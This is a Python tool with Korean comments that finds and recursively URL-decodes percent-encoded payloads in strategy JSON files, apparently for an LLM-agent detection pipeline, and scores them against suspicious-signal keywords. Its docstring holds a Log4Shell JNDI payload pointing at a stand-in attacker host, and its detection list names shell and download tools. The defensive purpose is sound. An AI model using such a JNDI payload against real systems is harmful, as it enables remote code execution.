#!/usr/bin/env python3
r"""
url_decode_tool.py

URL/percent-encoded payload 후보를 복원하는 보조 tool.

역할
- strategy_precheck.py가 pending으로 올린 strategy JSON을 입력으로 받는다.
- raw / decoded_preview / normalized_payload / nested_candidates 등에 포함된
  percent-encoded 문자열을 찾는다.
- %24%7B...%7D 같은 URL-encoded payload를 복원한다.
- recursive 옵션으로 double URL encoding도 처리한다.
- 결과는 llm_agent.py가 원본 pending strategy에 병합할 수 있는 JSON 형태로 출력한다.

예:
    %24%7Bjndi%3Aldap%3A%2F%2Fattacker.example%2Fa%7D
    -> ${jndi:ldap://attacker.example/a}

실행 예:
    python llm_agents/url_decode_tool.py \
      --input data/strategy/url_encoded_log4shell_strategy.pending.json \
      --output data/strategy/url_encoded_log4shell_url_decode.result.json \
      --options-json "{\"recursive\": true, \"max_depth\": 2}"

출력 필드
- ok
- tool
- candidate_count
- decoded_candidate_count
- decoded_candidates
- normalized_candidates
- best_candidates
- error
"""

from __future__ import annotations

import argparse
import json
import re
import sys
from pathlib import Path
from typing import Any, Dict, Iterable, List, Optional, Set
from urllib.parse import unquote, unquote_plus


PERCENT_ENCODED_RE = re.compile(r"%(?:[0-9A-Fa-f]{2})")
URLISH_TOKEN_RE = re.compile(r"[A-Za-z0-9._~:/?#\[\]@!$&'()*+,;=%{}\\-]{6,}")


DEFAULT_OPTIONS: Dict[str, Any] = {
    "recursive": True,
    "max_depth": 2,
    "plus_as_space": True,
    "deduplicate": True,
    "min_percent_sequences": 1,
    "keep_unchanged": False,
}


SUSPICIOUS_SIGNALS = [
    "${jndi:",
    "jndi:",
    "ldap://",
    "rmi://",
    "dns://",
    "http://",
    "https://",
    "powershell",
    "cmd.exe",
    "/bin/sh",
    "wget ",
    "curl ",
    "base64",
]


def load_json(path: Path) -> Dict[str, Any]:
    with path.open("r", encoding="utf-8") as f:
        obj = json.load(f)
    if not isinstance(obj, dict):
        raise ValueError(f"JSON root must be object: {path}")
    return obj


def write_json(path: Path, obj: Dict[str, Any]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("w", encoding="utf-8") as f:
        json.dump(obj, f, ensure_ascii=False, indent=2)
        f.write("\n")


def parse_options(options_json: Optional[str]) -> Dict[str, Any]:
    options = dict(DEFAULT_OPTIONS)
    if not options_json:
        return options

    parsed = json.loads(options_json)
    if not isinstance(parsed, dict):
        raise ValueError("--options-json must be a JSON object")

    for key, value in parsed.items():
        if key in DEFAULT_OPTIONS:
            options[key] = value

    options["recursive"] = bool(options.get("recursive", True))
    options["max_depth"] = max(1, int(options.get("max_depth", 2)))
    options["plus_as_space"] = bool(options.get("plus_as_space", True))
    options["deduplicate"] = bool(options.get("deduplicate", True))
    options["min_percent_sequences"] = max(1, int(options.get("min_percent_sequences", 1)))
    options["keep_unchanged"] = bool(options.get("keep_unchanged", False))
    return options


def iter_strings(obj: Any, path: str = "$") -> Iterable[Dict[str, str]]:
    """JSON object 내부의 모든 문자열 값을 path와 함께 순회한다."""
    if isinstance(obj, str):
        yield {"path": path, "value": obj}
    elif isinstance(obj, dict):
        for key, value in obj.items():
            yield from iter_strings(value, f"{path}.{key}")
    elif isinstance(obj, list):
        for idx, value in enumerate(obj):
            yield from iter_strings(value, f"{path}[{idx}]")


def percent_sequence_count(text: str) -> int:
    return len(PERCENT_ENCODED_RE.findall(text))


def looks_percent_encoded(text: str, min_percent_sequences: int = 1) -> bool:
    if not isinstance(text, str) or not text:
        return False
    return percent_sequence_count(text) >= min_percent_sequences


def extract_urlish_tokens(text: str) -> List[str]:
    """
    긴 문자열 안에서 percent-encoded fragment만 후보로 잡는다.
    전체 문자열이 URI인 경우도 있고, header 안에 일부만 들어있는 경우도 있어서
    URL-ish token 단위로 한 번 더 추출한다.
    """
    tokens = []
    for match in URLISH_TOKEN_RE.finditer(text):
        token = match.group(0)
        if "%" in token and looks_percent_encoded(token):
            tokens.append(token)

    if looks_percent_encoded(text):
        tokens.append(text)

    return tokens


def recursive_url_decode(value: str, *, recursive: bool, max_depth: int, plus_as_space: bool) -> List[Dict[str, Any]]:
    """
    URL decode를 수행하고 depth별 결과를 반환한다.
    unchanged 결과는 호출부에서 옵션에 따라 제거한다.
    """
    results: List[Dict[str, Any]] = []
    current = value

    for depth in range(1, max_depth + 1):
        decoded = unquote_plus(current) if plus_as_space else unquote(current)

        results.append({
            "depth": depth,
            "input": current,
            "decoded": decoded,
            "changed": decoded != current,
        })

        if not recursive or decoded == current:
            break

        current = decoded

    return results


def score_decoded_candidate(decoded: str) -> int:
    lower = decoded.lower()
    score = 0

    for signal in SUSPICIOUS_SIGNALS:
        if signal in lower:
            score += 5

    if "${" in decoded and "}" in decoded:
        score += 3
    if "://" in decoded:
        score += 2
    if len(decoded) >= 12:
        score += 1

    # URL decode 후에도 percent encoding이 남아 있으면 double encoding 가능성.
    if looks_percent_encoded(decoded):
        score += 1

    return score


def dedupe_candidates(candidates: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    seen: Set[str] = set()
    out: List[Dict[str, Any]] = []

    for item in candidates:
        key = item.get("decoded") or item.get("normalized_payload") or ""
        if key in seen:
            continue
        seen.add(key)
        out.append(item)

    return out


def collect_source_candidates(strategy_obj: Dict[str, Any], options: Dict[str, Any]) -> List[Dict[str, Any]]:
    """
    strategy JSON 내부 문자열 중 percent-encoded 후보를 수집한다.
    기존 strategy_precheck.py가 preview만 저장해도 동작하도록 전체 JSON을 순회한다.
    """
    min_percent_sequences = int(options.get("min_percent_sequences", 1))
    collected: List[Dict[str, Any]] = []

    for item in iter_strings(strategy_obj):
        value = item["value"]
        if "%" not in value:
            continue

        for token in extract_urlish_tokens(value):
            if not looks_percent_encoded(token, min_percent_sequences=min_percent_sequences):
                continue

            collected.append({
                "source_path": item["path"],
                "raw": token,
                "percent_sequence_count": percent_sequence_count(token),
            })

    return collected


def decode_candidates(source_candidates: List[Dict[str, Any]], options: Dict[str, Any]) -> List[Dict[str, Any]]:
    decoded_candidates: List[Dict[str, Any]] = []

    recursive = bool(options.get("recursive", True))
    max_depth = int(options.get("max_depth", 2))
    plus_as_space = bool(options.get("plus_as_space", True))
    keep_unchanged = bool(options.get("keep_unchanged", False))

    for source in source_candidates:
        raw = source["raw"]
        decode_steps = recursive_url_decode(
            raw,
            recursive=recursive,
            max_depth=max_depth,
            plus_as_space=plus_as_space,
        )

        for step in decode_steps:
            decoded = step["decoded"]

            if not keep_unchanged and decoded == raw:
                continue

            decoded_candidates.append({
                "source_path": source.get("source_path"),
                "raw": raw,
                "decoded": decoded,
                "normalized_payload": decoded,
                "decode_depth": step["depth"],
                "changed": step["changed"],
                "percent_sequence_count": source.get("percent_sequence_count"),
                "score": score_decoded_candidate(decoded),
            })

    if bool(options.get("deduplicate", True)):
        decoded_candidates = dedupe_candidates(decoded_candidates)

    decoded_candidates.sort(key=lambda x: x.get("score", 0), reverse=True)
    return decoded_candidates


def build_result(strategy_path: Path, strategy_obj: Dict[str, Any], options: Dict[str, Any]) -> Dict[str, Any]:
    source_candidates = collect_source_candidates(strategy_obj, options)
    decoded_candidates = decode_candidates(source_candidates, options)

    normalized_candidates = []
    for item in decoded_candidates:
        decoded = item.get("decoded")
        if isinstance(decoded, str) and decoded:
            normalized_candidates.append({
                "source": "url_decode_tool",
                "raw": item.get("raw"),
                "normalized_payload": decoded,
                "decoded_preview": decoded[:500],
                "decode_depth": item.get("decode_depth"),
                "score": item.get("score"),
                "source_path": item.get("source_path"),
            })

    best_candidates = decoded_candidates[:5]

    return {
        "ok": True,
        "tool": "url_decode_tool",
        "input_strategy": str(strategy_path),
        "options": options,
        "candidate_count": len(source_candidates),
        "decoded_candidate_count": len(decoded_candidates),
        "normalized_candidate_count": len(normalized_candidates),
        "source_candidates": source_candidates[:20],
        "decoded_candidates": decoded_candidates,
        "normalized_candidates": normalized_candidates,
        "best_candidates": best_candidates,
        "error": None,
    }


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("--input", required=True, help="Input strategy pending JSON file")
    parser.add_argument("--output", required=True, help="Output url decode result JSON file")
    parser.add_argument("--options-json", default="", help="JSON object containing url decode options")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    input_path = Path(args.input)
    output_path = Path(args.output)

    try:
        options = parse_options(args.options_json)
        strategy_obj = load_json(input_path)
        result = build_result(input_path, strategy_obj, options)
        write_json(output_path, result)
        print(json.dumps(result, ensure_ascii=False, indent=2))
    except Exception as e:
        result = {
            "ok": False,
            "tool": "url_decode_tool",
            "input_strategy": str(input_path),
            "options_json": args.options_json,
            "candidate_count": 0,
            "decoded_candidate_count": 0,
            "normalized_candidate_count": 0,
            "source_candidates": [],
            "decoded_candidates": [],
            "normalized_candidates": [],
            "best_candidates": [],
            "error": str(e),
        }
        try:
            write_json(output_path, result)
        finally:
            print(json.dumps(result, ensure_ascii=False, indent=2))
        raise SystemExit(1)


if __name__ == "__main__":
    main()
